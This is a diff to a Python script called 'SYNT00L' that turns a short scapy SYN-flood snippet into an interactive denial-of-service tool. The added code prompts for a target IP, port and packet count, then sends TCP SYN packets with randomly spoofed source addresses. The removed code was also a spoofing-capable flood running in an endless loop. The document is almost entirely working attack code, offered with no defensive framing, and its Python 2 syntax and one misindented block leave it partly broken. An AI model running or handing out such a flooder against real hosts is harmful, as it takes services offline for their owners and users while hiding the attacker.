@@ -1,21 +1,53 @@
 print ("SYNT00L by Vicky(telegram-@i_am_vicky_8055)")
-import scapy
-from IPy import IP
+
+from scapy.all import *
+import os
+import sys
+import random
+
+def randomIP():
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
+
+def randInt():
+	x = random.randint(1000,9000)
+	return x	
+
+def SYN_Flood(dstIP,dstPort,counter):
+	total = 0
+	print "Packets are sending ..."
+	for x in range (0,counter):
+		s_port = randInt()
+		s_eq = randInt()
+		w_indow = randInt()
+
+		IP_Packet = IP ()
+		IP_Packet.src = randomIP()
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP ()	
+		TCP_Packet.sport = s_port
+		TCP_Packet.dport = dstPort
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = s_eq
+		TCP_Packet.window = w_indow
+
+		send(IP_Packet/TCP_Packet, verbose=0)
+		total+=1
+	sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
 
-# forge IP packet with target ip as the destination IP address
-ip = IP(dst=target_ip)
-# or if you want to perform IP Spoofing (will work as well)
-# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+def info():
+	os.system("clear")
+dstIP = raw_input ("\nTarget IP : ")
+	dstPort = input ("Target Port : ")
+	
+	return dstIP,int(dstPort)
+	
 
-# forge a TCP SYN packet with a random source port
-# and the target port as the destination port
-tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+def main():
+	dstIP,dstPort = info()
+	counter = input ("How many packets do you want to send : ")
+	SYN_Flood(dstIP,dstPort,int(counter))
 
-# add some flooding data (1KB in this case)
-raw = Raw(b"X"*1024)
-
-# stack up the layers
-p = ip / tcp / raw
-# send the constructed packet in a loop until CTRL+C is detected 
-send(p, loop=1, verbose=0)
+main()
